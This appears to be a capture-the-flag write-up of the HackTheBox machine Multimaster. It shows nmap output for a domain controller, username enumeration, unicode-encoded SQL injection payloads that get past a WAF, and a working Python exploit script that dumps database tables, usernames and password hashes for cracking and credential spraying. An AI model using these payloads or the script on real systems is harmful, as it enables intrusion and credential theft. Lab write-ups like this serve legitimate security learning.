# NOTE
Following ippsec's video to learn a bunch of new things :)
# Enumeration
IP: 10.10.10.179nmap -sC -sV -oA nmap/silo 10.10.10.82
## Nmap
```bash
sudo nmap -sC -sV -oA nmap/multimaster 10.10.10.179
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-12 08:16 EST
Nmap scan report for 10.10.10.179
Host is up (0.051s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: 403 - Forbidden: Access is denied.
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-12 13:23:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-11-12T13:24:34+00:00; +6m59s from scanner time.
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2022-11-11T13:21:35
|_Not valid after:  2023-05-13T13:21:35
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2022-11-12T13:23:54+00:00
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Lots of ports open. Seems to be a domain controller.
A few hostnames
MEGACORP.LOCAL MULTIMASTER

## Port 80 enumeration
Can enumerate users via the colleague finder.
```list
sbauer
okent
ckane
kpage
shayna
james
rmartin
zac
jorden
alyx
ilee
nbourne
zpowers
aldom
minato
```

Checking for valid kerberos users.
none are valid.

Fuzz api for bad characters.
```bash
wfuzz -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -c -s 1 -H "Content-Type: application/json;charset=utf-8"
```
There is a WAF which is blocking brute forcing. 
bad chars are \' and \# 
utf8 encoding seems to get around the blacklist.
```
{"name":"a\u27\u2d\u2d \u2d"} #a'-- -
```
check for a union injection with utf8 encoding to avoid a blacklist.
```
{"name":"a\u0027  u\u006eion sel\u0065ct 1,2,3,4,5\u002d\u002d \u002d"
} #a' union select 1,2,3,4,5-- -
```
a' union select 1,2,3,'string',5
This is messy to use so going to make a python script.
```python
import requests, json,cmd
url = 'http://10.10.10.179/api/getColleagues'
input = "a' union select 1,2,3,'HELLO',5-- -"
header = {"Content-Type":"application/json;charset=utf-8"}
  
def gen_payload(input):
	payload = ""
	for i in input:
		payload+=r"\u{:04x}".format(ord(i))
	return payload
	  
class exploit(cmd.Cmd):
	prompt = "> "
	  
	def default(self,line):
		payload = gen_payload(line)
		data = '{"name":"'+payload+'"}'
		r = requests.post(url,data=data,headers = header)
		print(r.text)
	def do_union(self,line):
		payload = "a' union select 1,2,3,"+line+",5-- -"
		data = '{"name":"'+gen_payload(payload)+'"}'
		r = requests.post(url,data=data,headers = header)
		r = json.loads(r.text)
		print(r[0]['email'])
  
exploit().cmdloop()
```
Now enumerate the sql database
```python_script
> union db_name()
Hub_DB
> union (select string_agg(name,',') from hub_db..sysobjects where xtype = 'U')
Colleagues,Logins
> union (select string_agg(username,',') from Logins)
sbauer,okent,ckane,kpage,shayna,james,cyork,rmartin,zac,jorden,alyx,ilee,nbourne,zpowers,aldom,minatotw,egre55
> union (select string_agg(password,',') from Logins)
```
The output is stored in password.hashes
Guessing sha-384 which is wrong.
Using all hash formats with 384.
One works and cracks a few hashes.

Check with crackmapexec.
```bash
crackmapexec smb 10.10.10.179 users.lst passwords.lst
```
no hits.
